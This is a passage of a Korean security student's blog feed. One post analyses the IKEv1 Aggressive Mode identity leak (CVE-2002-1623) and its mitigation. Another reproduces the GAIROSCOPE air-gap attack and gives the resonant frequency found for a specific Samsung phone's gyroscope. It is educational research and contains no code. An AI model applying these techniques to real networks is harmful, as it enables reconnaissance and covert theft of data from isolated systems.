      &lt;li&gt;&lt;a href=&quot;#3-2-ikev1-phase1-authenticated-with-public-key-encryption-has-no-vulnerability&quot; id=&quot;markdown-toc-3-2-ikev1-phase1-authenticated-with-public-key-encryption-has-no-vulnerability&quot;&gt;&lt;strong&gt;3-2) IKEv1 Phase1 Authenticated with Public Key Encryption (Has no vulnerability)&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-3-ikev1-phase1-authentication-with-a-revised-mode-of-public-key-encryption&quot; id=&quot;markdown-toc-3-3-ikev1-phase1-authentication-with-a-revised-mode-of-public-key-encryption&quot;&gt;&lt;strong&gt;3-3) IKEv1 Phase1 Authentication with a Revised Mode of Public Key Encryption&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-4-ikev1-phase1-authentication-with-a-pre-shared-key&quot; id=&quot;markdown-toc-3-4-ikev1-phase1-authentication-with-a-pre-shared-key&quot;&gt;&lt;strong&gt;3-4) &lt;mark&gt;IKEv1 Phase1 Authentication with a Pre-Shared Key&lt;/mark&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#conclusion&quot; id=&quot;markdown-toc-conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;학교 과제로 했던 건데, 내용이 좋아서 블로그에 백업!
오랜만에 어택 벡터 찾는 느낌이 나서 재밌었던 과제로 기억한다.
그리고…. 한국어 수업인데 정줄 놓고 쓰다 보니 영어로 쓰고 제출까지 하는 바람에 교수님께 양해를 구했던….. 과제다…….
(당시 진짜 바빴고 참고 문서가 다 영어라서 정말 실수였다)&lt;/p&gt;

&lt;p&gt;아무튼 읽으시는 분께. 미안합니다.
DeepL이 번역을 솔찬히 잘하니 추천드립니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;section01-about-the-ipsec&quot;&gt;&lt;strong&gt;Section01. About the IPSec&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;It is a well-known fact that if the logical complexity gets higher, the possibility of the existence of critical contradiction gets higher too. Hence, I am going to describe the subprotocols of IPSec and pick the most complex protocol among them.&lt;/li&gt;
  &lt;li&gt;IPSec consists of ESP, AH, and IKE protocol. IKE is known as the most complex protocol because of its mathematical and dependency complexity. Therefore, I am going to find a vulnerability that exists in the &lt;strong&gt;design of the IKE.&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;IKE is consisted of OAKLEY, SKEME, and ISAKMP and provides 1) PSK-based, 2) PKE-based, 3) RPKE-based, and 4) Signature-based encryption. Because PKE and RPKE are well-known secure protocols(at least their design is secure), I prefer delving into the PSK-based and Signature-based encryption of IKE.&lt;/li&gt;
  &lt;li&gt;According to the inference above, I found a vulnerability that existed in the design of the IKEv1. Section 2 is the description of the vulnerability which is followed by section 3, details of the Aggressive mode of IKEv1 and attack vectors that exists in the protocol.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;section02-vulnerability-reported-for-ikev1&quot;&gt;&lt;strong&gt;Section02. Vulnerability Reported for IKEv1&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-1-description&quot;&gt;&lt;strong&gt;2-1) Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;CVE-2002-1623 / CVSS 2.0: 5.0 Medium&lt;/p&gt;

&lt;p&gt;The design of the Internet Key Exchange (IKE) protocol, when using Aggressive Mode for shared secret authentication, does not encrypt initiator or responder identities during negotiation, which may allow remote attackers to determine valid usernames by (1) monitoring responses before the password is supplied or (2) sniffing.&lt;/p&gt;

&lt;p&gt;This vulnerability is originally reported for Checkpoint FireWall-1 SecuRemote.&lt;/p&gt;

&lt;p&gt;Because Checkpoint implemented the IKE standard for aggressive mode correctly, it could not keep itself from having the vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-2-impact&quot;&gt;&lt;strong&gt;2-2) Impact&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Devices that implement this protocol in aggressive mode will leak username information while negotiating IKE sessions. This can be led to the reconnaissance of networks for further attacks.&lt;/p&gt;

&lt;p&gt;The vulnerable product is CheckPoint VPN-1/FireWall-1 product, involving the use of SecuRemote/SecureClient and IKE Aggressive mode.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-3-solution&quot;&gt;&lt;strong&gt;2-3) Solution&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use an alternative mode and authentication method.&lt;/p&gt;

&lt;p&gt;For example, both the Main mode with PSK authentication and the Aggressive mode with PK authentication will provide identity protection.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-4-details-of-the-vulnerability&quot;&gt;&lt;strong&gt;2-4) Details of the vulnerability&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;usernames are susceptible to brute-force guessing when using IKE Aggressive Mode&lt;/p&gt;

    &lt;p&gt;By sending an IKE Phase-1 aggressive mode packet with the following payloads the firewall will either 1) send back an IKE notification message indicating that the user is not valid in some way, or 2) it will respond with an aggressive mode packet indicating that the user exists and is valid.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;usernames are passed in cleartext using IKE Aggressive Mode&lt;/p&gt;

    &lt;p&gt;(Refer the Section 3-which discusses the attack vectors that could be found in the IKE specification)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;section03-aggressive-mode-and-its-vulnerable-points---rfc2409&quot;&gt;&lt;strong&gt;Section03. Aggressive mode and its vulnerable points - RFC2409&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;While OAKLEY defines “modes”, ISAKMP defines “phases”.  The relationship between the two is very straightforward and IKE presents different exchanges as modes that operate in one of two phases.&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;Phase 1&lt;/mark&gt; is where the two ISAKMP peers establish a secure, authenticated channel with which to communicate. This is called the ISAKMP Security Association (SA). “Main Mode” and “Aggressive Mode” each accomplish a phase 1 exchange. “Main Mode” and “Aggressive Mode” MUST ONLY be used in phase 1.&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;Phase 2&lt;/mark&gt; &lt;em&gt;**&lt;/em&gt;is where Security Associations are negotiated on behalf of services such as IPsec or any other service which needs key material and/or parameter negotiation. “Quick Mode” accomplishes a phase 2 exchange. “Quick Mode” MUST ONLY be used in phase 2.&lt;/p&gt;

&lt;p&gt;“Main Mode” for phase 1 provides identity protection. &lt;mark&gt;When identity protection is not needed, &quot;Aggressive Mode&quot; can be used to reduce round trips even further.&lt;/mark&gt;&lt;/p&gt;

&lt;p&gt;Four different authentication methods are allowed with either Main Mode or Aggressive Mode.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;digital signature&lt;/li&gt;
  &lt;li&gt;two forms of authentication with public key encryption&lt;/li&gt;
  &lt;li&gt;pre-shared key&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-1-ikev1-phase1-authenticated-with-signatures&quot;&gt;&lt;strong&gt;3-1) &lt;mark&gt;IKEv1 Phase1 Authenticated with Signatures&lt;/mark&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ipsecVuln01/Untitled.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aggressive mode with signatures in conjunction with ISAKMP is described as follows:&lt;/p&gt;

&lt;p&gt;IDii: Identity of the initiator&lt;/p&gt;

&lt;p&gt;IDir: Identity of the Responder&lt;/p&gt;

&lt;p&gt;KE: Key exchange payload which contains public information exchanged in a DHKE&lt;/p&gt;

&lt;p&gt;As you can see above, the IDs of the party negotiating the signature are exposed on the network.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-2-ikev1-phase1-authenticated-with-public-key-encryption-has-no-vulnerability&quot;&gt;&lt;strong&gt;3-2) IKEv1 Phase1 Authenticated with Public Key Encryption (Has no vulnerability)&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ipsecVuln01/Untitled%201.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unlike other authentication methods, authentication with public key encryption allows for identity protection in Aggressive Mode.&lt;/p&gt;

&lt;p&gt;(If the authentication method is public key encryption, the nonce and identity payloads MUST be encrypted with the public key of the other party. Only the body of the payloads is encrypted, the payload headers are left in the clear.)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-3-ikev1-phase1-authentication-with-a-revised-mode-of-public-key-encryption&quot;&gt;&lt;strong&gt;3-3) IKEv1 Phase1 Authentication with a Revised Mode of Public Key Encryption&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ipsecVuln01/Untitled%202.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Identical to 2), the body of the payloads is encrypted.&lt;/p&gt;

&lt;p&gt;(In this mode, the nonce is still encrypted using the public key of the peer, however, the peer’s identity (and the certificate if it is sent) is encrypted using the negotiated symmetric encryption algorithm (from the SA payload) with a key derived from the nonce.)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-4-ikev1-phase1-authentication-with-a-pre-shared-key&quot;&gt;&lt;strong&gt;3-4) &lt;mark&gt;IKEv1 Phase1 Authentication with a Pre-Shared Key&lt;/mark&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ipsecVuln01/Untitled%203.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDii: Identity of the initiator&lt;/p&gt;

&lt;p&gt;IDir: Identity of the Responder&lt;/p&gt;

&lt;p&gt;The key can only be identified by the IP address of the peers since HASH_I must be computed before the initiator has processed IDir.&lt;/p&gt;

&lt;p&gt;As you can see above, the IDs of the party negotiating the SA are exposed on the network.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;In conclusion, CVE-2002-1623 was meant to be discovered because the Aggressive mode of the IKE allows cleartext exchange of peer identifiers during phase 1-authentication using 1) Signatures or 2) Pre-Shared Key.&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Jul 2023 08:20:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/ipsecVuln01</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/ipsecVuln01</guid>
      </item>
    
      <item>
        <title>[논문 재현] Gyroscope 센서의 공진을 이용한 Airgap Break 논문 재현 프로젝트(1)</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-배경지식&quot; id=&quot;markdown-toc-0-배경지식&quot;&gt;0. 배경지식&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-gyroscope&quot; id=&quot;markdown-toc-01-gyroscope&quot;&gt;0.1. Gyroscope?&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#011-자이로스코프의-원리&quot; id=&quot;markdown-toc-011-자이로스코프의-원리&quot;&gt;0.1.1 자이로스코프의 원리&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#012-디지털-자이로스코프가-주는-신호의-의미&quot; id=&quot;markdown-toc-012-디지털-자이로스코프가-주는-신호의-의미&quot;&gt;0.1.2. 디지털 자이로스코프가 주는 신호의 의미&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#013-해당-신호를-실험에-사용할-수-있는-이유&quot; id=&quot;markdown-toc-013-해당-신호를-실험에-사용할-수-있는-이유&quot;&gt;0.1.3. 해당 신호를 실험에 사용할 수 있는 이유&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-공격-시나리오&quot; id=&quot;markdown-toc-02-공격-시나리오&quot;&gt;0.2. 공격 시나리오&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-연구-방법&quot; id=&quot;markdown-toc-1-연구-방법&quot;&gt;1. 연구 방법&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-공진주파수&quot; id=&quot;markdown-toc-11-공진주파수&quot;&gt;1.1. 공진주파수?&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#111-공진-대역을-찾기-위해&quot; id=&quot;markdown-toc-111-공진-대역을-찾기-위해&quot;&gt;1.1.1. 공진 대역을 찾기 위해…&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#112-결과&quot; id=&quot;markdown-toc-112-결과&quot;&gt;1.1.2. 결과&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-transmitter-air-gapped-computer&quot; id=&quot;markdown-toc-12-transmitter-air-gapped-computer&quot;&gt;1.2. Transmitter: Air-gapped computer&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-receiver-smartphone&quot; id=&quot;markdown-toc-13-receiver-smartphone&quot;&gt;1.3. Receiver: Smartphone&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-결과-및-성능-평가&quot; id=&quot;markdown-toc-2-결과-및-성능-평가&quot;&gt;2. 결과 및 성능 평가&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-데모-영상&quot; id=&quot;markdown-toc-21-데모-영상&quot;&gt;2.1. 데모 영상&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-성능-평가&quot; id=&quot;markdown-toc-22-성능-평가&quot;&gt;2.2. 성능 평가&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-아쉬웠던-점&quot; id=&quot;markdown-toc-3-아쉬웠던-점&quot;&gt;3. 아쉬웠던 점&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-참고문헌&quot; id=&quot;markdown-toc-4-참고문헌&quot;&gt;4. &lt;strong&gt;참고문헌&lt;/strong&gt;&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#41-논문-원본&quot; id=&quot;markdown-toc-41-논문-원본&quot;&gt;4.1. 논문 원본&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#42-참고-문헌&quot; id=&quot;markdown-toc-42-참고-문헌&quot;&gt;4.2. 참고 문헌&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-배경지식&quot;&gt;0. 배경지식&lt;/h1&gt;

&lt;p&gt;Reproduce 타겟 논문은 “GAIROSCOPE: Injecting Data from Air-Gapped Computers to Nearby Gyroscopes”로, &lt;a href=&quot;https://arxiv.org/abs/2208.09764&quot;&gt;여기&lt;/a&gt;에서 다운받을 수 있다.
이 프로젝트는 논문을 오류가 많은 방식으로 재현했다. 조만간 팀원과 함께 논문의 원래 방식대로 재현해서 정리글을 올리려 하니 그것도 많은 기대 부탁!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;01-gyroscope&quot;&gt;0.1. Gyroscope?&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;011-자이로스코프의-원리&quot;&gt;0.1.1 자이로스코프의 원리&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;핸드폰에는 주로 MEMS 센서가 사용된다.&lt;/li&gt;
  &lt;li&gt;총 6개의 축이 있으나 그 중 3개가 중요하다; x, y, z&lt;/li&gt;
  &lt;li&gt;이 중 x축과 y축은 실존하며, z축은 가상의 개념이다
    &lt;ol&gt;
      &lt;li&gt;x축은 Sensing Direction&lt;/li&gt;
      &lt;li&gt;y축은 Driving Direction 으로 칭한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;센서에는 Proof mass라는 물질이 발려 있다(사진의 파란색)
    &lt;ol&gt;
      &lt;li&gt;이 물질은 미세전류의 영향 하에 y축 방향으로 진행한다.&lt;/li&gt;
      &lt;li&gt;이 때, z축에 대해 \(\Omega\)의 각속도로 센서가 회전할 경우 코리올리 효과로 인해 x축으로의 가속력이 발생한다.&lt;/li&gt;
      &lt;li&gt;기본은 이러한 x축, y축의 각속도 값을 이용해 센서의 위상을 알아내는 것이다.&lt;/li&gt;
      &lt;li&gt;그러나 x축 방향으로의 움직임에서 관성력과 원심력 요소를 감안해 제거해야 한다.&lt;/li&gt;
      &lt;li&gt;이를 위해 proof mass를 하나 더 발라두고 y축 정반대 방향으로 진행케 해 잡음 신호를 상쇄시킨다. (위 사진에서 파란색 사각형이 두 개인 이유)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;012-디지털-자이로스코프가-주는-신호의-의미&quot;&gt;0.1.2. 디지털 자이로스코프가 주는 신호의 의미&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;자이로스코프 센서 (둘 다 time domain 신호 발생)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;아날로그 센서
    &lt;ul&gt;
      &lt;li&gt;시간 축에 대해 특정 진동수로 특정 전압을 발생시킴으로써 위상의 변화를 알린다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;디지털 센서
    &lt;ul&gt;
      &lt;li&gt;시간 축에 대해 rad/sec, 즉 자이로스코프의 x, y, z 축에 대한 회전의 각속도 값을 전달함으로써 위상의 변화를 알린다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;013-해당-신호를-실험에-사용할-수-있는-이유&quot;&gt;0.1.3. 해당 신호를 실험에 사용할 수 있는 이유&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;자이로스코프의 공진을 다룬 논문 “Vulnerability of MEMS Gyroscopes to Targeted Acoustic Attacks”
    &lt;ul&gt;
      &lt;li&gt;여기에서 사용하는 신호는 아날로그 센서의 ‘전압’&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;그러나 우리가 사용해야 하는 신호는 디지털 센서의 ‘rad/s’&lt;/p&gt;

        &lt;p&gt;→ 디지털 센서가 주는 값을 공진 탐지에 사용할 수 있는가?&lt;/p&gt;

        &lt;p&gt;→ ‘전압’과 ‘rad/s’는 비례하는가?&lt;/p&gt;

        &lt;p&gt;→ 아날로그 센서는 \(\Omega\)에 비례해 전압을 발생, 디지털 센서는 \(\Omega_{axis}\)에 비례해 dps(degree per second)/LSB(최소비트변화) 발생&lt;/p&gt;

        &lt;p&gt;→ 즉, 디지털 센서가 주는 값을 공진 탐지에 사용할 수 있다(각속도를 매개변수로 사용하여 아날로그의 신호와 디지털의 신호 간 비례관계를 밝힐 수 있기 때문). 그러나, x, y, z축 중 어느 축이 영향을 받았는지 구분해 내야 한다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-공격-시나리오&quot;&gt;0.2. 공격 시나리오&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이원적 구조(에어갭으로 분리된 망의 PC, 데이터를 읽어들일 스마트폰)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;공격자는 에어갭으로 분리된 PC에, 파일을 바이너리로 읽어 와 음파로 변환해 출력하는 프로그램을 설치
    &lt;ol&gt;
      &lt;li&gt;이는 웹 페이지의 JS로도 구현이 가능함&lt;/li&gt;
      &lt;li&gt;해당 프로그램이 출력하는 음파는 특정 스마트폰 기종에 설치된 자이로스코프의 공진을 일으킴&lt;/li&gt;
      &lt;li&gt;또한 그 음파는 비가청대역 주파수로 이루어져 있음&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;자이로스코프의 공진 여부를 감지해 바이너리 데이터로 변환하는 프로그램이 설치된 핸드폰을 음파가 닿을 수 있는 책상에 놓고 앱 실행&lt;/li&gt;
  &lt;li&gt;에어갭으로 분리된 네트워크상에 존재하는 데이터가 핸드폰으로 전송&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-연구-방법&quot;&gt;1. 연구 방법&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 최대한 소스 코드를 찾아 봤지만, 아무것도 나오지 않았다.&lt;/p&gt;

&lt;p&gt;따라서 Transmitter의 소스 코드의 일부는 논문에 쓰인 코드를 참고해 새로 만들었고,&lt;/p&gt;

&lt;p&gt;Receiver의 소스 코드는 순서도부터 계획해 만들었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-공진주파수&quot;&gt;1.1. 공진주파수?&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이 익스플로잇의 핵심은 특정 기종 핸드폰에 탑재된 자이로스코프 센서가 공진하는 주파수 대역을 찾아내는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;111-공진-대역을-찾기-위해&quot;&gt;1.1.1. 공진 대역을 찾기 위해…&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;핸드폰 제조 회사에 문의&lt;/p&gt;

    &lt;p&gt;→ 시스템 칩 팀의 기밀사항으로 알려줄 수 없다는 거절&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;주파수 대역을 Brute-Forcing&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;우리가 가진 기기는 삼성 SM-A605K (Galaxy Jean, 2018)&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;논문에 소개된 자이로스코프 센서들은 아래와 같다:&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%201.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;이 중 디지털 센서에서 공진이 발생한 대역은
        &lt;ul&gt;
          &lt;li&gt;7,900~20,000 Hz&lt;/li&gt;
          &lt;li&gt;25,000~29,000 Hz&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;일반적인 스피커는 20,000Hz 대역 주변부까지를 커버할 수 있다&lt;/li&gt;
      &lt;li&gt;따라서 첫 번째 구간을 Brute-Forcing하기로 결정&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;112-결과&quot;&gt;1.1.2. 결과&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;normal-status (아무 주파수도 없을 때 일반적인 양상)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%202.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;들어오는 값의 오차를 없애기 위해 초당 다회 값을 읽어 오는 자이로스코프의 특징을 이용했다
    &lt;ul&gt;
      &lt;li&gt;2초동안 특정 주파수를 생성하고, 동일 타임스탬프 하에 기록된 값들의 평균치를 구함&lt;/li&gt;
      &lt;li&gt;2초마다 주파수가 50Hz씩 높아지는 특징을 이용, 타임스탬프를 Hz로 변환해 그래프의 X축을 구성하게끔 함&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;이 과정에서 20120Hz ~20200Hz 부근에서 공진주파수를 찾아냄&lt;/li&gt;
  &lt;li&gt;정확한 공진주파수 대역을 좁히기 위해 Hz 변이폭을 10Hz로 두고, 동일 실험을 5회 진행&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;1회차 실험&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%203.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;2회차 실험&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%204.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;3회차 실험&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%205.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;4회차 실험&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%206.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;5회차 실험&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%207.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;실험 결과
    &lt;ul&gt;
      &lt;li&gt;20150Hz와 20170Hz가 공진주파수 대역으로 좁혀졌다.&lt;/li&gt;
      &lt;li&gt;가운데 20160Hz가 공진주파수 대역이 아닌 이유는,
        &lt;ul&gt;
          &lt;li&gt;자이로스코프가 자체적으로 오류를 방지하기 위해 자이로스코프가 의도치 않은 노이즈에 의해 일정 정도 이상으로 떨릴 경우 신호 필터링을 거는데(논문에서는 이걸 가리켜 10Hz 로우컷이라 칭한다)&lt;/li&gt;
          &lt;li&gt;그로 인해 노이즈가 발생하는 부근의 한중간에서 신호 발생 그래프가 푹 꺼지는 Dip이 발생하기 때문이다.&lt;/li&gt;
          &lt;li&gt;즉 20160Hz는 Dip 구간이므로 사용할 수 없는 공진대역.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

